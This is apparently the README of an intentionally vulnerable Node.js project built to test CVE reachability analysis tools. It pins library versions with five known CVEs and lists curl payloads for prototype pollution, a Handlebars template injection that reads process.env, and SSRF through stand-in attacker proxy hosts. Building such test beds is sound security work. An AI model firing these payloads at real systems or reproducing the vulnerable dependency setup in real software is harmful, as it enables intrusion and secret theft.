# Vulnerable Node.js Test Project

## ⚠️ WARNING
**This project contains intentional security vulnerabilities for testing purposes only!**
- DO NOT deploy to production
- DO NOT expose to the internet
- Use only in isolated test environments

## Overview
This is a test project designed to validate CVE reachability analysis tools. It contains 5 known CVEs from different sources:
- Direct dependencies (3 CVEs)
- Transitive dependencies (1 CVE)
- One CVE demonstrates vulnerability through class inheritance

## Requirements
- Node.js 16+ (LTS recommended)
- npm

## Installation

```bash
# Clone or navigate to the project directory
cd node-example-project

# Install dependencies (includes vulnerable versions)
npm install

# Start the server
npm start

# Or start with minimist CVE trigger
npm run start-vuln
# or
node server.js --__proto__.polluted=true
```

## Server Information
- **Default URL**: http://localhost:3000
- **Custom Port**: `node server.js --port 4000`
- **Health Check**: GET http://localhost:3000/health

## CVEs Included

### 1. CVE-2021-23337 - Lodash Prototype Pollution
- **Package**: lodash@4.17.19 (Direct Dependency)
- **Type**: Prototype Pollution
- **Vulnerable Function**: `_.defaultsDeep()`
- **Endpoint**: POST `/api/config/merge`

### 2. CVE-2021-44906 - Minimist Prototype Pollution
- **Package**: minimist@1.2.5 (Transitive via yargs@15.4.1)
- **Type**: Prototype Pollution
- **Vulnerable Function**: `minimist()`
- **Trigger**: Command-line arguments

### 3. CVE-2020-7699 - express-fileupload Prototype Pollution
- **Package**: express-fileupload@1.1.7 (Direct Dependency)
- **Type**: Prototype Pollution
- **Vulnerable Function**: `parseNested()`
- **Endpoint**: POST `/api/upload`

### 4. CVE-2021-23369 - Handlebars Template Injection
- **Package**: handlebars@4.7.6 (Direct Dependency)
- **Type**: Remote Code Execution (Template Injection)
- **Vulnerable Function**: `Handlebars.compile()`
- **Special**: **Triggered via Class Inheritance** (parent → child)
- **Endpoint**: POST `/api/render/user`

### 5. CVE-2021-3749 - Axios SSRF
- **Package**: axios@0.21.0 (Direct Dependency)
- **Type**: SSRF (Server-Side Request Forgery)
- **Vulnerable Function**: `axios.get()` with proxy config
- **Endpoint**: POST `/api/proxy/fetch`

## API Endpoints & Testing

### 1. Test CVE-2021-23337 (Lodash)

```bash
curl -X POST http://localhost:3000/api/config/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "true"}}'
```

**Expected Response**: Configuration merged with pollution detection

### 2. Test CVE-2021-44906 (Minimist)

```bash
# Start server with polluted argument
node server.js --__proto__.polluted=true

# Check health endpoint
curl http://localhost:3000/health
```

**Expected Response**: Pollution detected in startup logs and health check

### 3. Test CVE-2020-7699 (express-fileupload)

```bash
curl -X POST http://localhost:3000/api/upload \
  -F "file=@/path/to/any/file.txt" \
  -F "__proto__[polluted]=true"
```

**Expected Response**: File uploaded with pollution detection

### 4. Test CVE-2021-23369 (Handlebars - Inheritance)

```bash
# Safe template
curl -X POST http://localhost:3000/api/render/user \
  -H "Content-Type: application/json" \
  -d '{
    "template": "Hello {{name}}!",
    "userData": {"name": "World"}
  }'

# Malicious template (demonstrates vulnerability)
curl -X POST http://localhost:3000/api/render/user \
  -H "Content-Type: application/json" \
  -d '{
    "template": "{{constructor.constructor(\"return process.env\")()}}",
    "userData": {}
  }'
```

**Expected Response**: Template rendered (malicious template may expose environment)

### 5. Test CVE-2021-3749 (Axios SSRF)

```bash
# With malicious proxy
curl -X POST http://localhost:3000/api/proxy/fetch \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://example.com",
    "proxy": {
      "host": "malicious-proxy.com",
      "port": 8080
    }
  }'

# Alternative endpoint
curl -X POST http://localhost:3000/api/proxy/fetch-via-user \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://example.com",
    "proxyHost": "attacker-controlled.com",
    "proxyPort": 8080
  }'
```

**Expected Response**: Request attempted through specified proxy

## Project Structure

```
node-example-project/
├── package.json                    # Vulnerable dependencies
├── server.js                       # Main Express server (uses yargs/minimist)
├── src/
│   ├── templates/
│   │   ├── BaseRenderer.js        # Parent class with vulnerable handlebars
│   │   └── UserRenderer.js        # Child class (inheritance pattern)
│   ├── utils/
│   │   ├── configMerger.js        # Lodash vulnerability
│   │   ├── fileHandler.js         # express-fileupload vulnerability
│   │   └── proxyClient.js         # Axios vulnerability
│   └── routes/
│       ├── config.js              # Config endpoints
│       ├── render.js              # Render endpoints
│       ├── upload.js              # Upload endpoints
│       └── proxy.js               # Proxy endpoints
├── README.md                       # This file
└── VULNERABILITY_MAP.md            # Detailed CVE mapping with call chains
```

## Inheritance Pattern (CVE-2021-23369)

The handlebars vulnerability demonstrates how vulnerabilities can be triggered through class inheritance:

1. **BaseRenderer** (parent) defines `compileTemplate()` - the vulnerable function
2. **UserRenderer** (child) inherits from BaseRenderer
3. When `UserRenderer.renderUserProfile()` is called, it triggers the parent's vulnerable method

This tests whether CVE analysis tools can trace vulnerabilities across inheritance hierarchies.

## Verification

After starting the server, verify all CVEs are reachable:

```bash
# Get server info
curl http://localhost:3000/

# Check health and pollution status
curl http://localhost:3000/health
```

## For CVE Reachability Analysis

This project is designed to test if your CVE reachability analysis tool can:

1. ✅ Detect vulnerabilities in direct dependencies
2. ✅ Detect vulnerabilities in transitive dependencies
3. ✅ Trace call chains from your code to vulnerable functions
4. ✅ Follow vulnerability paths through class inheritance
5. ✅ Map specific CVE IDs to reachable code paths

See **VULNERABILITY_MAP.md** for detailed call chains and exact vulnerable function locations.

## Dependencies

```json
{
  "express": "^4.18.2",           // Web framework (safe)
  "lodash": "4.17.19",            // CVE-2021-23337 ⚠️
  "yargs": "15.4.1",              // Pulls minimist 1.2.5 ⚠️
  "express-fileupload": "1.1.7",  // CVE-2020-7699 ⚠️
  "handlebars": "4.7.6",          // CVE-2021-23369 ⚠️
  "axios": "0.21.0"               // CVE-2021-3749 ⚠️
}
```

## Cleanup

To remove the project:

```bash
rm -rf node-example-project
```

## License

MIT - For testing purposes only

## Disclaimer

This software is provided for security testing and educational purposes only. The maintainers are not responsible for any misuse or damage caused by this software. Use at your own risk in isolated environments only.

